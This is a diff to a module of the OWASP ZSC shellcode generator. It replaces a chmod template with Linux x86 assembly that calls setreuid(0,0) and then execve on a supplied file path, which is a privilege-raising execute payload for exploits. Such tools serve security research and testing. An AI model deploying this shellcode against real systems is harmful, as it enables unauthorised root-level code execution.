@@ -8,16 +8,21 @@ https://lists.owasp.org/mailman/listinfo/owasp-zsc-tool-project [ owasp-zsc-tool
 '''
 from core import stack
 from lib.opcoder.linux_x86 import convert
-def chmod(perm_num,file_add):
-	return '''push   $0x0f
-pop    %%eax
-%s
+def exc(file_to_exec):
+	return '''
+mov    $0x46,%%al
+xor    %%ebx,%%ebx
+xor    %%ecx,%%ecx
+int    $0x80
 %s
 mov    %%esp,%%ebx
+xor    %%eax,%%eax
+mov    $0xb,%%al
 int    $0x80
-mov    $0x01,%%al
-mov    $0x01,%%bl
-int    $0x80'''%(perm_num,file_add)
+mov    $0x1,%%al
+mov    $0x1,%%bl
+int    $0x80
+'''%(file_to_exec)
 def run(data):
-	file_to_perm,perm_num=data[0],data[1]
-	return chmod(stack.generate(perm_num,'%ecx','int'),stack.generate(file_to_perm,'%ebx','string'))
+	file_to_exec=data[0]
+	return exc(stack.generate(file_to_exec,'%ebx','string'))
